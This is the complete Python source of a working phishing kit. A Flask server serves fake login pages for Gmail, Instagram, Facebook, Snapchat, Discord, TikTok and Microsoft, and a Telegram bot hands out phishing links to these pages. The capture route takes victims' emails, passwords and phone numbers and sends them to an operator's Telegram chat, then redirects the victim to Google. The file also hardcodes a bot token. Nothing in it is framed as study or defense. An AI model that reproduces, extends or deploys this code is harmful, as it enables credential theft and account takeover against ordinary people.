from flask import Flask, request
import os
import requests
import threading
import time
import json

app = Flask(__name__)

BOT_TOKEN = "8232409100:AAExUp0yXjQzN7js3bQriSKq5MiOClU3BeU"
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '6593129349')
PHISHING_DATA = []
STATS = {'visits': 0, 'captures': 0}
running = True
last_update_id = 0

def send_msg(chat_id, text, reply_markup=None):
    data = {'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'}
    if reply_markup:
        data['reply_markup'] = json.dumps(reply_markup)
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=data, timeout=5)
    except:
        pass

def answer_callback(query_id):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", 
                     data={'callback_query_id': query_id}, timeout=5)
    except:
        pass

def bot_loop():
    global last_update_id
    while running:
        try:
            resp = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", 
                              params={'offset': last_update_id + 1, 'timeout': 20}).json()
            if resp['ok']:
                for update in resp['result']:
                    last_update_id = update['update_id']
                    
                    if 'message' in update:
                        msg = update['message']
                        cid = msg['chat']['id']
                        txt = msg.get('text', '').lower()
                        uid = str(msg['from']['id'])
                        
                        if '/start' in txt:
                            markup = {
                                "inline_keyboard": [
                                    [{"text": "📧 GMAIL", "callback_data": f"gmail_{uid}"}],
                                    [{"text": "📸 INSTAGRAM", "callback_data": f"insta_{uid}"}],
                                    [{"text": "📘 FACEBOOK", "callback_data": f"fb_{uid}"}],
                                    [{"text": "👻 SNAPCHAT", "callback_data": f"snap_{uid}"}],
                                    [{"text": "💬 DISCORD", "callback_data": f"discord_{uid}"}],
                                    [{"text": "🎵 TIKTOK", "callback_data": f"tiktok_{uid}"}],
                                    [{"text": "🔐 MICROSOFT", "callback_data": f"ms_{uid}"}]
                                ]
                            }
                            send_msg(cid, f"🎉 <b>WELCOME!</b>\n👇 Pick service 👇", markup)
                        
                        if '/data' in txt and str(cid) == ADMIN_CHAT_ID:
                            if PHISHING_DATA:
                                recent = "\n".join([f"{d['service']}: {d['email']}" for d in PHISHING_DATA[-5:]])
                                send_msg(cid, f"<b>🎣 HITS:</b>\n{recent}")
                            else:
                                send_msg(cid, "📭 No data")
                    
                    if 'callback_query' in update:
                        query = update['callback_query']
                        query_id = query['id']
                        cid = query['from']['id']
                        data = query['data']
                        
                        answer_callback(query_id)
                        
                        service, uid = data.split('_', 1)
                        url = f"https://myphish.onrender.com/phish/{service}/{uid}"
                        send_msg(cid, f"✅ <b>{service.upper()} LINK:</b>\n<code>{url}</code>")
                        
        except Exception as e:
            pass
        
        time.sleep(1)

@app.route('/')
def home():
    return "<h1>🎣 PHISH KING LIVE!</h1>"

@app.route('/phish/<service>/<int:user_id>')
def phish(service, user_id):
    STATS['visits'] += 1
    html = f'''
<!DOCTYPE html>
<html>
<head>
<title>{service.upper()}</title>
<meta name="viewport" content="width=device-width">
<style>
body{{background:linear-gradient(135deg,#667eea,#764ba2);color:#333;font-family:Arial;padding:50px;margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh}}
.box{{background:#fff;border-radius:20px;padding:40px;max-width:380px;width:100%;box-shadow:0 20px 40px rgba(0,0,0,0.2);text-align:center}}
h1{{font-size:28px;margin:0 0 20px}}
input{{width:100%;padding:16px;margin:10px 0;border:2px solid #ddd;border-radius:12px;box-sizing:border-box;font-size:16px}}
.btn{{width:100%;padding:16px;background:#667eea;color:white;border:none;border-radius:12px;font-size:18px;cursor:pointer}}
</style>
</head>
<body>
<div class="box">
<h1>🔐 {service.upper()}</h1>
<form method="POST">
<input name="email" placeholder="Email *" required>
<input name="password" placeholder="Password *" type="password" required>
<input name="phone" placeholder="Phone">
<button class="btn">🔓 Login</button>
</form>
</div>
</body>
</html>'''
    return html

@app.route('/phish/<service>/<int:user_id>', methods=['POST'])
def capture(service, user_id):
    global STATS
    STATS['captures'] += 1
    data = {
        'email': request.form.get('email', ''),
        'pass': request.form.get('password', ''),
        'phone': request.form.get('phone', ''),
        'service': service.upper()
    }
    PHISHING_DATA.append(data)
    
    if ADMIN_CHAT_ID:
        send_msg(int(ADMIN_CHAT_ID), f"🎣 <b>{data['service']}:</b>\n📧 <code>{data['email']}</code>\n🔑 <code>{data['pass']}</code>")
    
    return '<html><body style="background:#28a745;color:white;padding:50px;text-align:center"><h1>✅ Redirecting...</h1><script>setTimeout(()=>location.href="https://google.com",1500)</script></body></html>'

if __name__ == '__main__':
    threading.Thread(target=bot_loop, daemon=True).start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
